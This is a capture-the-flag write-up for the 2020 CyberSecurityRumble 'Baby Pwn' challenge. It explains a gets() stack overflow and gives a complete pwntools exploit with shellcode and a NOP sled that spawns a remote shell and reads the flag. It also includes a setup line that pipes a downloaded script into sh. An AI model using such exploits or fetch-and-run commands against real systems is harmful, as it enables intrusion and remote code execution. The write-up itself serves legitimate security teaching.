# CyberSecurityRumble CTF 2020

## Baby Pwn

> 100 + 0 (65 solves)
>
> Never done any kind of binary exploitation before? This should get you started. Grab some gdb or radare, turn off **ASLR**, forget about stack canaries, and let the fun begin.
>
> `nc chal.cybersecurityrumble.de 1990`
> 
> [files](baby-pwn-c84231024c5f62bf35ec0c201b3605ec.tar.xz)  

Tags: _pwn_ _x86-64_ _remote-shell_ _shellcode_ _bof_


## Summary

The description pretty much gives it all away, this is going to be oldskool pre-ASLR shellcoding--should be _fun_. BTW, Linux didn't have ASLR [mainstream] until 2005, however it feels like it has been around forever.

The gamemasters have provided all the source, including Docker configs so that you can precisely mirror the challenge service.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

PIE and nothing else, however with ASLR disabled (assumed from the description), does it really matter?


### Read the source

```c
int check_user_hash(char* flag) {
    unsigned char user_md5[MD5_DIGEST_LENGTH * 2 + 1];
    unsigned char flag_md5[MD5_DIGEST_LENGTH];

    /* calculate MD5("CSR{...}") */
    calc_string_md5(flag, flag_md5);

    /* read user input, convert to hexadecimal */
    gets(user_md5);
    hex_to_binary(user_md5, user_md5, strlen(user_md5));

    return memcmp(flag_md5, user_md5, MD5_DIGEST_LENGTH) ? 0 : 1;
}
```

`gets` with no stack canary provides an easy buffer overflow.

For analysis I prefer the output from Ghidra vs. the source:

```c
ulong check_user_hash(char *param_1)
{
  size_t len;
  ulong local_88;
  ulong local_80;
  ulong local_78;
  ulong local_70;
  
  MD5_Init((MD5_CTX *)&local_78);
  len = strlen(param_1);
  MD5_Update((MD5_CTX *)&local_78,param_1,len);
  MD5_Final((uchar *)&local_88,(MD5_CTX *)&local_78);
  gets((char *)(MD5_CTX *)&local_78);
  len = strlen((char *)(MD5_CTX *)&local_78);
  hex_to_binary((long)(MD5_CTX *)&local_78,(long)(MD5_CTX *)&local_78,len);
  return (ulong)((local_80 ^ local_70 | local_88 ^ local_78) == 0);
}
```

All I'm interested in is the `gets` call with the parameter of `local_78`.  This tells me that the buffer is `0x78` bytes from the return address on the stack.  No need to guess.

All we need now is a payload and an address.  But before that we need to look at `hex_to_binary` since that is called and alters the stack on the way to `ret`:

```c
void hex_to_binary(char *in, unsigned char* out, size_t length) {
    size_t i;
    assert("length must be even" && (length % 2) == 0);
    length /= 2;
    for (i = 0; i < length; i++) {
        out[i] = char_to_repr(in[i * 2]) << 4 | char_to_repr(in[i * 2 + 1]);
    }
}
```

`hex_to_binary` is expecting an even number of chars validated by `char_to_repr` (hex digits):

```c
unsigned char char_to_repr(char in) {
    if (in >= '0' && in <= '9')
	return in - '0';
    if (in >= 'a' && in <= 'f')
	return in - 'a' + 0xa;
    if (in >= 'A' && in <= 'F')
	return in - 'A' + 0xa;
    assert("not in hex digit range" && 0);
}
```

`hex_to_binary` loops through and updates `local_78` in place--best if our shellcode is after this.


### Find the target address

> This is only one of many ways to solve this.  Without ASLR and the included Docker container, the address of the binary and libc should be consistent enabling ROP, one_gadget, etc...  However, the port number _is_ `1990`, so let's do this like it's the [90's](http://www.phrack.org/issues/49/14.html#article).

> For test/dev I did this in an Ubuntu 20.04 container, but for the target service, I had to build their Docker container.

After extracting the challenge files, just `cd` into the `baby-pwn-for-download/docker` directory and type:

```
$ docker build -t babypwn .
Sending build context to Docker daemon  27.14kB
...
Successfully built a2b13660aa2c
Successfully tagged babypwn:latest
```

Then start with:

```
docker run --rm -d -p 1990:6666 --name babypwn --privileged babypwn
```

After that, get in the container and install some tools:

```
$ docker exec -it babypwn /bin/bash
# apt-get update && apt-get -qy install gdb python3 wget
# wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
```

From another terminal connect to port 1990, e.g.:

```
nc localhost 1990
```

You should receive:

```
It's easy. Give me MD5($flag), get $flag in return.
```

Now from the docker session type:

```
# cd /home/ctf
# gdb babypwn $(pidof babypwn)
```

At this point we're in the middle of `gets`, so set a break point just after `gets`:

```
(gdb) b *check_user_hash+64
(gdb) c
```

From the other terminal (where `nc` is running) type `AAAA` and press return, then back to the gdb session type:

```
(gdb) telescope $rsp 18
0x00007fffffffe720│+0x0000: 0x1be3e93037b0d224	 ← $rsp
0x00007fffffffe728│+0x0008: 0x65eb4ac4ed908384
0x00007fffffffe730│+0x0010: 0x1be3e90041414141 ("AAAA"?)	 ← $rax, $rbp
0x00007fffffffe738│+0x0018: 0x65eb4ac4ed908384
0x00007fffffffe740│+0x0020: 0x00000000000000f8
0x00007fffffffe748│+0x0028: 0x0000000000000000
0x00007fffffffe750│+0x0030: 0x0000000000000000
0x00007fffffffe758│+0x0038: 0x0000000000000000
0x00007fffffffe760│+0x0040: 0x0000000000000000
0x00007fffffffe768│+0x0048: 0x0000000000000000
0x00007fffffffe770│+0x0050: 0x0000000000000000
0x00007fffffffe778│+0x0058: 0x0000000000000000
0x00007fffffffe780│+0x0060: 0x0000000000000000
0x00007fffffffe788│+0x0068: 0x0000000000000000
0x00007fffffffe790│+0x0070: 0x0000000000000003
0x00007fffffffe798│+0x0078: 0x0000000000000003
0x00007fffffffe7a0│+0x0080: 0x00007fffffffe7b0  →  "CSR{this-is-not-the-real-flag}\n"
0x00007fffffffe7a8│+0x0088: 0x0000555555555176  →  <main+150> test eax, eax
```

Line `+0x0088` is the return address (the `<main+150> test eax, eax` is also a give away) and it is exactly `0x78` from line `+0x0010` (see our `AAAA`) as expected.

So we should be able to write an even number of `A` (e.g. 6), followed by a couple of nulls to terminate the string, followed by our payload plus padding to line `+0x0088` where we would put in the address of our payload `0x00007fffffffe738`.  And if you're wondering why this does not change, well, it's because ASLR is disabled in their service startup script `babypwn_svc`:

```
service babypwn
{
    type         = UNLISTED
    protocol     = tcp
    socket_type  = stream
    port         = 6666
    server       = /usr/bin/setarch
    server_args  = x86_64 --addr-no-randomize /home/ctf/babypwn
    user         = ctf
    wait         = no
    env          = PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
}
```

`setarch $(uname -m) --addr-no-randomize` will execute the next parameter passed to it without ASLR.

Traditionally, we'd setup a NOP sled just in case the stack is a little off, even with ASLR disabled, its possible for other factors to have the stack not exactly where expected (however for this challenge it appears to be as predictable as it _gets_).

Before doing the math and building the longest possible sled we need to consider the following just before the return is called:

```
001014af 48 83 c4 78     ADD        RSP,0x78
001014b3 0f b6 c0        MOVZX      EAX,AL
001014b6 5d              POP        RBP
001014b7 41 5c           POP        R12
``` 

The stack pointer is moved to `+0x0078` (see stack above), then the next two values popped into `RBP` and `R12`.  So unless you want to lose the end of your payload, say clear of the 16 bytes just before the return address.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'INFO'
context.log_file = 'remote.log'
p = remote('chal.cybersecurityrumble.de', 1990)
stack = 0x00007fffffffe738

# http://shell-storm.org/shellcode/files/shellcode-905.php
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'
shellcode += (8 - (len(shellcode) % 8)) *  b'\x90'

payload  = b''
payload += 6 * b'A'
payload += 2 * b'\0'
payload += (0x78 - 8 - 16 - len(shellcode)) * b'\x90'
payload += shellcode
payload += (0x78 - len(payload)) * b'\x90'
payload += p64(stack)

p.sendlineafter('return.\n',payload)
p.interactive()
```

`stack` is from the analysis above.

`shellcode` is just the first x86_64 Linux shell code I stumbled on from [http://shell-storm.org](http://shell-storm.org) padded to be a multiple of 8 bytes (stack aligned).

The `payload` starts with an even number of `A`s followed by NULLs to fool `hex_to_binary` and `char_to_repr` while keeping the total length to 8 (stack aligned).

Appended to the `payload` is a NOP sled that will put the end of our shellcode 16 bytes from the return address to avoid getting popped off just before return (see analysis).  The `0x78 - 8 - 16` is from the analysis above (`0x78` bytes from return address `- 8` for the `hex_to_binary` bypass, followed by `- 16` for the 16 bytes to be avoided before the return address).

Appended next is the actual `shellcode`, then 16 bytes of anything really, then the new return address (`stack`).

That's it.


Output:

```bash
# ./exploit.py
[+] Opening connection to chal.cybersecurityrumble.de on port 1990: Done
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 52
lrwxrwxrwx   1 root root    7 Oct  8 01:31 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  340 Oct 30 18:36 dev
drwxr-xr-x   1 root root 4096 Oct 30 18:36 etc
-rw-r--r--   1 root root   45 Oct 30 16:07 flag.txt
drwxr-xr-x   1 root root 4096 Oct 30 18:36 home
lrwxrwxrwx   1 root root    7 Oct  8 01:31 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Oct  8 01:31 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Oct  8 01:31 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Oct  8 01:31 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Oct  8 01:31 media
drwxr-xr-x   2 root root 4096 Oct  8 01:31 mnt
drwxr-xr-x   2 root root 4096 Oct  8 01:31 opt
dr-xr-xr-x 310 root root    0 Oct 30 18:36 proc
drwx------   2 root root 4096 Oct  8 01:34 root
drwxr-xr-x   1 root root 4096 Oct 23 17:32 run
lrwxrwxrwx   1 root root    8 Oct  8 01:31 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Oct  8 01:31 srv
dr-xr-xr-x  13 root root    0 Oct 30 23:13 sys
drwxrwxrwt   1 root root 4096 Oct 30 18:35 tmp
drwxr-xr-x   1 root root 4096 Oct  8 01:31 usr
drwxr-xr-x   1 root root 4096 Oct  8 01:34 var
$ cat flag.txt
CSR{back-in-1990-life-must-have-been-easier}
```
